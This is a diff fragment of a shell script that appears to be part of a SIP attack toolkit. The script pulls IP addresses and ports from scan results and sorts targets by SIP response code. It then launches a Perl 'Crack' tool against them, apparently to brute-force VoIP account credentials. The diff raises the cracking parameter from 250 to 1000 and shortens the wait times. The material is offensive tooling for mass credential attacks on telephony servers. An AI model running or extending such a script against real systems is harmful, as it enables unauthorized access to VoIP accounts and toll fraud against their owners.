@@ -1299,7 +1299,7 @@ grep -Po "(\d+\.){3}\d+:?(\d?){6}" result.txt >>IPS
 perl run IPS
 cat 401.pal 400.pal 403.pal 404.pal >> ipSIP
 rm IPS # remove the file IPS
-rm result.txt # remove the file
+mv result.txt =204.txt # change file name
 sleep 5
 
 echo -e "\nEnding Responses !\n"
@@ -1308,11 +1308,11 @@ echo -e "\nEnding Responses !\n"
 
 echo -e "\nStart SIP Crack ...\n"
 
-perl Crack 250 2 ipSIP
+perl Crack 1000 2 ipSIP
 rm ipSIP # remove the file ipSIP
 rm *.pal # remove the file
 
-sleep 50
+sleep 5
 
 echo -e "\nEnding crack !\n"
 echo -e "\nby Mohammad Elnwajha\n"
